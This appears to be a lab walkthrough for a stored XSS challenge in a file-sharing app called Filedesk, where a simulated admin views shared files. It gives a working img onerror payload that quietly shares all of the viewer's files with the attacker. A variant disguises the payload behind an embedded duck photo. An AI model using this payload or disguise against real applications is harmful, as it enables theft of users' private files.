In general, you can no longer execute cross site scripting attacks using inline `<script>` tags because modern browsers have more strict content security policies. However, there are still ways to get the browser to execute arbitrary code. We'll be using the following template:

```html
<img src='x' alt="ðŸ˜‡" onerror='XXS_GOES_HERE' />
```

The above HTML instructs the browser to load an image from the bogus source `x`. This will obviously fail! Many HTML elements also allow arbitrary code to be specified as event handler attributes as a string value which will be evaluated when that event occurs. In this case, the `onerror` attribute instructs the browser to evaluate the given string to handle an event. we can craft this string to be any arbitrary function:

```js
(async function() {
  console.log("ðŸ˜ˆ");
  const data = await api.listFiles();
  const user = await api.getUser("USERNAME");
  for (const file of data.owned_files) {
    await api.shareFile(file.id, user.id);
  }
})();
```

We can minify the above javascript and use it as the value of the `onerror` attribute to obtain the full XSS attack content (replace `USERNAME` with your actual username):

```html
<img src='x' alt="ðŸ˜‡" onerror='!async function(){console.log("ðŸ˜ˆ");let i=await api.listFiles(),a=await api.getUser("USERNAME");for(let e of i.owned_files)await api.shareFile(e.id,a.id)}();' />
```

Create a file in the Filedesk UI with this content. When you view it it will run this code.

Next, go to the `File Sharing` view for this file. There you will be able to share the file with the `admin` user. Once the file is shared with the admin user, a background task which simulates the admin user viewing files shared with them should trigger the XSS expliot within 30 seconds.


Note: Use this alternative file content to include an cute photo of an innocent looking duck.

```html
<img src="data:image/jpeg;base64,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" />
<img src='x' alt="ðŸ˜‡" onerror='!async function(){console.log("ðŸ˜ˆ");let i=await api.listFiles(),a=await api.getUser("USERNAME");for(let e of i.owned_files)await api.shareFile(e.id,a.id)}();' />
```
